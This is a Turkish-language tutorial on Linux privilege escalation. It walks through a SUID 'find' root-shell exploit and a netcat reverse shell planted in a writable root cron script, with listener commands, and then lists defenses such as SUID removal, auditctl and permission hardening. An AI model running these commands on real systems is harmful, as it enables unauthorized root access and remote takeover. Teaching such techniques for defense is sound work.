# Yetki Yükseltme (Privilege Escalation) Nedir?

Yetki yükseltme, bir kullanıcının sistemde sahip olmadığı veya normalde erişemeyeceği izinleri elde etme sürecidir. Saldırganlar, sistemlerdeki zayıflıkları veya yanlış yapılandırmaları kullanarak daha yüksek ayrıcalıklar elde edebilirler.

## Yetki Yükseltme Türleri

### 1. Dikey Yetki Yükseltme (Privilege Elevation)
Kullanıcı, kendisinden daha yetkili bir hesaba (root gibi) erişim kazanır.

### 2. Yatay Yetki Yükseltme (Horizontal Escalation)
Kullanıcı, kendi seviyesindeki başka bir hesabın erişim haklarını ele geçirir.

---

## Yetki Yükseltme Senaryoları

### 1. SUID Exploit ile Yetki Yükseltme

#### **SUID Nedir?**
SUID (Set User ID), Linux'ta bir dosyanın çalıştırıldığında sahibinin yetkileriyle çalışmasını sağlayan özel bir izin bitidir. Eğer bir program root tarafından sahiplenmiş ve SUID biti ayarlanmışsa, herhangi bir kullanıcı o programı çalıştırdığında root yetkileriyle çalıştırabilir.

#### **Adım 1: SUID Biti Olan Dosyaları Bulma**

Sistem üzerindeki SUID dosyalarını bulmak için:
```bash
find / -perm -4000 2>/dev/null
```
- `find /` : Tüm dosya sisteminde arama yapar.
- `-perm -4000` : SUID biti ayarlanmış dosyaları bulur.
- `2>/dev/null` : Hata mesajlarını gizlemek için kullanılır.

#### **Adım 2: Tehlikeli SUID Dosyalarını Tespit Etme**

"find" komutunun SUID biti olup olmadığını kontrol edelim:
```bash
ls -l /usr/bin/find
```
- `ls -l` : Dosyanın ayrıntılı izinlerini gösterir.
- `/usr/bin/find` : İncelenecek dosyanın yolu.

Eğer çıktı şu şekildeyse:
```
-rwsr-xr-x 1 root root ….  /usr/bin/find
```
Burada `s` harfi, SUID bitinin aktif olduğunu gösterir.

#### **Adım 3: Exploit Kullanarak Root Yetkisi Alma**

```bash
/usr/bin/find . -exec /bin/sh -p \; -quit
```
- `/usr/bin/find .` : Geçerli dizinde `find` komutunu çalıştırır.
- `-exec /bin/sh -p \;` : `sh` kabuğunu root yetkileriyle çalıştırır.
- `-quit` : İşlem tamamlandığında çıkış yapar.

#### **Adım 4: Yetki Kazandığımızı Doğrulama**

```bash
whoami
```
- `whoami` : Mevcut kullanıcının kim olduğunu gösterir.

Eğer "root" çıktısı alınırsa, başarıyla yetki yükseltme gerçekleşmiştir.

---

### 2. Dosya İzinlerini Kötüye Kullanarak Yetki Yükseltme

#### **Yanlış Dosya İzinleri Nedir?**
Root tarafından çalıştırılan bir dosyanın herkes tarafından yazılabilir olması, saldırganların bu dosyayı değiştirerek root yetkisi kazanmasına neden olabilir.

#### **Adım 1: Yazılabilir Root Dosyalarını Bulma**

```bash
find / -user root -perm -2 -type f 2>/dev/null
```
- `find /` : Tüm sistemde arama yapar.
- `-user root` : Sahibi root olan dosyaları bulur.
- `-perm -2` : Diğer kullanıcılar tarafından yazılabilir dosyaları bulur.
- `-type f` : Yalnızca dosyaları listeler.
- `2>/dev/null` : Hata mesajlarını gizler.

#### **Adım 2: Tehlikeli Bir Script Bulma**

```bash
ls -l /etc/cron.daily/backup.sh
```
- `ls -l` : Dosyanın ayrıntılı izinlerini gösterir.

#### **Adım 3: Kötü Amaçlı Kod Ekleyerek Root Yetkisi Alma**

```bash
echo "nc -e /bin/bash 192.168.1.100 4444" >> /etc/cron.daily/backup.sh
```
- `echo` : Komutun çıktısını dosyaya yazmak için kullanılır.
- `nc -e /bin/bash 192.168.1.100 4444` : Saldırganın IP’sine ters kabuk açar.

#### **Adım 4: Saldırgan Makineden Dinleme Yapma**

```bash
nc -lvnp 4444
```
- `nc` : Netcat aracı.
- `-l` : Dinleme modunda çalıştırır.
- `-v` : Ayrıntılı çıktı gösterir.
- `-n` : DNS çözümlemeyi devre dışı bırakır.
- `-p 4444` : 4444 numaralı portu dinler.

---

## Yetki Yükseltmeye Karşı Savunma Önlemleri

### 1. SUID Biti Olan Dosyaları Kısıtlayın

```bash
chmod -s /path/to/suid_binary
```
- `chmod -s` : SUID bitini kaldırır.

Kritik SUID dosyalarını takip edin:
```bash
auditctl -w /usr/bin/find -p x -k suid_exec
```
- `auditctl -w` : Belirtilen dosyayı izle.
- `-p x` : Çalıştırma işlemlerini kaydet.
- `-k suid_exec` : Kayıt anahtarı.

### 2. Root Dosyalarının İzinlerini Sıkılaştırın

```bash
chmod 750 /etc/cron.daily/backup.sh
chown root:root /etc/cron.daily/backup.sh
```
- `chmod 750` : Root ve grup dışındaki kullanıcıların erişimini engeller.
- `chown root:root` : Dosyanın sahibi ve grubunu root yapar.

### 3. Cron Joblarını Güvenli Hale Getirin

```bash
crontab -l
cat /etc/crontab
```
- `crontab -l` : Kullanıcının cron görevlerini listeler.
- `cat /etc/crontab` : Sistem genelindeki cron görevlerini gösterir.

### 4. Şüpheli Aktiviteleri İzleyin

```bash
netstat -tulnp | grep LISTEN
ps aux | grep root
```
- `netstat -tulnp` : Açık portları ve dinleyen işlemleri gösterir.
- `ps aux | grep root` : Root kullanıcıya ait çalışan işlemleri listeler.